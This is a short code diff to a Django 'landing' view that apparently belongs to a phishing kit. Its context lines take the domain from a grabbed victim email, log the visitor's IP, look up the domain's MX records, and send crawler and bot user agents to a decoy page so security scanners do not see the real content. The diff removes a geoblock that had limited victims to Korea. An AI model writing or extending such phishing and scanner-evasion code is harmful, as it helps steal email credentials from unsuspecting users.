@@ -6,7 +6,6 @@ from email.mime.multipart import MIMEMultipart
 from django.template.loader import get_template
 from django.template import Context
 from django.template.loader import render_to_string
-from django.contrib.gis.geoip2 import GeoIP2
 import dns.resolver
 import socket
 import requests
@@ -79,16 +78,9 @@ def landing(request):
         "crawler"]
     domainapi = emailgrabber[emailgrabber.index('@') + 1 : ]
     mx_records = dns.resolver.query(domainapi, 'MX')
-    # Initialize GeoIP2 object
-    geo = GeoIP2()
-
-    # Get user's country based on IP address
-    country = geo.country(iplogger)
+    
     if any(bot in user_agent.lower() for bot in bots):
         return render(request, 'bots.html')
-    # Check if user is from Korea
-    if country['country_code'] != 'KR':
-        return render(request, 'block.html') # Return block page if user is not from Korea
     else:
         for mx in mx_records:
             mx_hostname = str(mx.exchange).rstrip('.')
